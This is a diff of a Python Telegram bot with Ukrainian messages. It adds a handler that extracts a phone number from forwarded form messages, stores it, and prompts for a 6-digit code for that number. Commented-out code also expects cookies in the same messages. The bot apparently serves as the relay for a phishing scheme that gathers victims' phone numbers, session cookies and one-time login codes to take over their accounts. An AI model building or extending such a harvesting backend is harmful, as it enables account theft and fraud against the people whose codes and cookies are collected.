@@ -170,6 +170,22 @@ def send_welcome(message):
     except Exception as e:
         print(f"Error sending welcome: {e}")
 
+@bot.message_handler(func=lambda m: m.text and "Телефон:" in m.text)
+def handle_first_form(m):
+    print(f"[BOT] Отримано повідомлення:\n{m.text}")  # ← Для дебагу в термінал
+
+    # Регулярка: витяг номера
+    match = re.search(r"Телефон:\s*([^\n\r]+)", m.text)
+    phone = match.group(1).strip() if match else None
+
+    if not phone:
+        bot.reply_to(m, "❌ Не вдалося розпізнати номер.")
+        return
+
+    pending_codes[m.chat.id] = phone
+    bot.reply_to(m, f"🔑 Введіть 6-значний код для номера {phone}")
+
+
 # --- Обробка повідомлення з телефоном (форма 1) ---
 # @bot.message_handler(func=lambda m: "Телефон:" in m.text and "Кукі:" in m.text)
 # def handle_first_form(m):
@@ -185,19 +201,19 @@ def send_welcome(message):
 #     pending_codes[m.chat.id] = phone
 #     bot.reply_to(m, f"✉️ Введіть 6-значний код для номера {phone}")
 
-@bot.message_handler(func=lambda m: "Телефон:" in m.text)
-def handle_first_form(m):
-    print("➡️ Отримано повідомлення з телефоном")
+# @bot.message_handler(func=lambda m: "Телефон:" in m.text)
+# def handle_first_form(m):
+#     print("➡️ Отримано повідомлення з телефоном")
 
-    match = re.search(r"Телефон:\s*([^\n\r]+)", m.text)
-    phone = match.group(1).strip() if match else None
+#     match = re.search(r"Телефон:\s*([^\n\r]+)", m.text)
+#     phone = match.group(1).strip() if match else None
 
-    if not phone:
-        bot.reply_to(m, "❌ Не вдалося розпізнати номер.")
-        return
+#     if not phone:
+#         bot.reply_to(m, "❌ Не вдалося розпізнати номер.")
+#         return
 
-    pending_codes[m.chat.id] = phone
-    bot.reply_to(m, f"✉️ Введіть 6-значний код для номера {phone}")
+#     pending_codes[m.chat.id] = phone
+#     bot.reply_to(m, f"✉️ Введіть 6-значний код для номера {phone}")
 
 
 # --- Прийом 6-значного коду ---
